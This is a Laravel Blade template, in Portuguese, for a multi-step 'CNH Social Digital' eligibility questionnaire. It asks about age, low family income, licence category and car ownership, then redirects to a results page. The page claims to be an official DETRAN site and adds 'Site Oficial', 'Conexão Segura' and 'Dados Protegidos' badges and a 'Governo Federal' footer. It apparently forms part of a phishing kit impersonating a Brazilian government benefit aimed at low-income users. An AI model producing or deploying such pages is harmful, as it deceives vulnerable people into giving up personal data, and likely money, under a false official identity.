@extends('layouts.app')
@section('content')
    <div class="min-h-screen bg-background flex flex-col">
        @include('components.header')
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">CNH Social Digital</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div class="flex items-start justify-between">
                        <div>
                            <h1 class="text-2xl md:text-3xl font-bold text-[#1B4F9B] mb-2">Questionário</h1>
                        </div>
                    </div>
                    <p class="text-sm text-foreground leading-relaxed">Complete o questionário para prosseguir com o processo de aquisição do CNH Digital.</p>
                    <div class="flex flex-wrap gap-2 justify-center">
                        <div class="flex items-center gap-2 bg-green-50 text-green-700 px-3 py-1.5 rounded-md text-xs font-medium">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield h-4 w-4"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>
                            Site Oficial
                        </div>
                        <div class="flex items-center gap-2 bg-green-50 text-green-700 px-3 py-1.5 rounded-md text-xs font-medium">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-lock h-4 w-4"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                            Conexão Segura
                        </div>
                        <div class="flex items-center gap-2 bg-green-50 text-green-700 px-3 py-1.5 rounded-md text-xs font-medium">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-database h-4 w-4"><ellipse cx="12" cy="5" rx="9" ry="3"></ellipse><path d="M3 5V19A9 3 0 0 0 21 19V5"></path><path d="M3 12A9 3 0 0 0 21 12"></path></svg>
                            Dados Protegidos
                        </div>
                    </div>
                    <div class="bg-blue-50 p-4 rounded-lg space-y-2">
                        <div class="flex items-start gap-3">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info h-5 w-5 text-govBlue mt-0.5 flex-shrink-0"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg>
                            <div>
                                <h3 class="text-base font-bold text-govBlue">Ambiente Verificado</h3>
                                <p class="text-sm text-foreground mt-1">Esta é uma página oficial do DETRAN para verificação de identidade. Seus dados serão utilizados apenas para verificar sua elegibilidade para adquirir o benefício.</p>
                            </div>
                        </div>
                    </div>
                    <div class="flex items-center gap-2">
                        <div class="flex-1 h-2 bg-muted rounded-full overflow-hidden">
                            <div class="h-full bg-govBlue transition-all duration-300" id="progress-bar"></div>
                        </div>
                    </div>

                    <div class="border-2 border-govBlue rounded-lg p-5 space-y-4 step" id="step-1">
                        <div class="flex items-center gap-3">
                            <div class="bg-govBlue text-white rounded-full w-8 h-8 flex items-center justify-center font-bold text-sm flex-shrink-0">1</div>
                            <h2 class="text-lg font-semibold text-foreground">Qual sua idade?</h2>
                        </div>
                        <div role="radiogroup" aria-required="false" dir="ltr" class="grid gap-2 space-y-3" tabindex="0" style="outline: none;">
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="under18" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="under18" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="under18">Menor de 18 (Inapto)</label>
                            </div>
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="18-24" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="18-24" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="18-24">18 a 24</label>
                            </div>
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="25-35" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="25-35" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="25-35">25 a 35</label>
                            </div>
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="36-45" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="36-45" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="36-45">36 a 45</label>
                            </div>
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="45+" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="45+" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="45+">Acima de 45</label>
                            </div>
                        </div>
                    </div>
                    <div class="border-2 border-govBlue rounded-lg p-5 space-y-4 step hidden" id="step-2">
                        <div class="flex items-center gap-3">
                            <div class="bg-govBlue text-white rounded-full w-8 h-8 flex items-center justify-center font-bold text-sm flex-shrink-0">2</div>
                            <h2 class="text-lg font-semibold text-foreground">Você está desempregado ou com renda familiar inferior a R$3.100?</h2>
                        </div>
                        <div role="radiogroup" aria-required="false" dir="ltr" class="grid gap-2 space-y-3" tabindex="0" style="outline: none;">
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="true" data-state="checked" value="yes" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="income-yes" tabindex="0" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="income-yes">Sim</label>
                            </div>
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="no" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="income-no" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="income-no">Não</label>
                            </div>
                        </div>
                    </div>
                    <div class="border-2 border-govBlue rounded-lg p-5 space-y-4 step hidden" id="step-3">
                        <div class="flex items-center gap-3">
                            <div class="bg-govBlue text-white rounded-full w-8 h-8 flex items-center justify-center font-bold text-sm flex-shrink-0">3</div>
                            <h2 class="text-lg font-semibold text-foreground">Qual categoria deseja solicitar?</h2>
                        </div>
                        <div role="radiogroup" aria-required="false" dir="ltr" class="grid gap-2 space-y-3" tabindex="0" style="outline: none;">
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="category-a" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="category-a" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="category-a">Categoria A (moto)</label>
                            </div>
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="category-b" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="category-b" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="category-b">Categoria B (carro)</label>
                            </div>
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="both" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="both" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="both">Ambas</label>
                            </div>
                        </div>
                    </div>
                    <div class="border-2 border-govBlue rounded-lg p-5 space-y-4 step hidden" id="step-4">
                        <div class="flex items-center gap-3">
                            <div class="bg-govBlue text-white rounded-full w-8 h-8 flex items-center justify-center font-bold text-sm flex-shrink-0">4</div>
                            <h2 class="text-lg font-semibold text-foreground">O titular do CPF já tentou emitir a CNH alguma vez?</h2>
                        </div>
                        <div role="radiogroup" aria-required="false" dir="ltr" class="grid gap-2 space-y-3" tabindex="0" style="outline: none;">
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="yes" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="attempt-yes" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="attempt-yes">Sim</label>
                            </div>
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="no" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="attempt-no" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="attempt-no">Não</label>
                            </div>
                        </div>
                    </div>
                    <div class="border-2 border-govBlue rounded-lg p-5 space-y-4 step hidden" id="step-5">
                        <div class="flex items-center gap-3">
                            <div class="bg-govBlue text-white rounded-full w-8 h-8 flex items-center justify-center font-bold text-sm flex-shrink-0">5</div>
                            <h2 class="text-lg font-semibold text-foreground">Você ou um familiar próximo tem carro?</h2>
                        </div>
                        <div role="radiogroup" aria-required="false" dir="ltr" class="grid gap-2 space-y-3" tabindex="0" style="outline: none;">
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="yes" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="car-yes" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="car-yes">Sim</label>
                            </div>
                            <div class="option flex items-center space-x-3 border border-border rounded-lg p-4 hover:bg-blue-50 cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="no" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="car-no" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex-1 cursor-pointer text-base" for="car-no">Não</label>
                            </div>
                        </div>
                    </div>
                    <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 h-11 rounded-md px-8 w-full py-6 text-lg font-semibold transition-colors bg-govBlue hover:bg-govBlue/90 text-white" disabled="" id="btnContinuar">Próxima</button>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; {{date('Y')}} <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<style>
.option:hover{background-color:rgb(239 246 255);}
</style>
@endsection
@section('javascript')
<script>
    const userData = JSON.parse(sessionStorage.getItem("userData"));
    if(!userData){
        window.location.href = "{{url('/login')}}";
    }

    $('#btnContinuar').attr('disabled', true);

    $(document).on('click', '.option', function(){
        $('.option').find('button').html('');
        $(this).find('button').html(`<span data-state="checked" class="flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle h-2.5 w-2.5 fill-current text-current"><circle cx="12" cy="12" r="10"></circle></svg></span>`);
        selecionado = $(this).find('label').text();
        $('#btnContinuar').attr('disabled', false);
    });

    let step = 1;
    const totalSteps = 5;

    const btn = document.getElementById("btnContinuar");
    const progress = document.querySelector("#progress-bar .bg-govBlue");

    function updateUI() {
        document.querySelectorAll(".step").forEach((el, index) => {
            if (index + 1 === step) {
                el.classList.remove("hidden");
            } else {
                el.classList.add("hidden");
            }
        });

        const percent = (step / totalSteps) * 100;
        $('#progress-bar').css('width', percent + "%");

        if (step === totalSteps) {
            btn.textContent = "Avançar";
        } else {
            btn.textContent = "Continuar";
        }
    }

    $(document).on('click', '#btnContinuar', function(){
        $(this).attr('disabled', true);
        if (step < totalSteps) {
            step++;
            updateUI();
        } else {
            window.location.href = "{{url('/resultado')}}";
        }
    });

    updateUI();

</script>
@endsection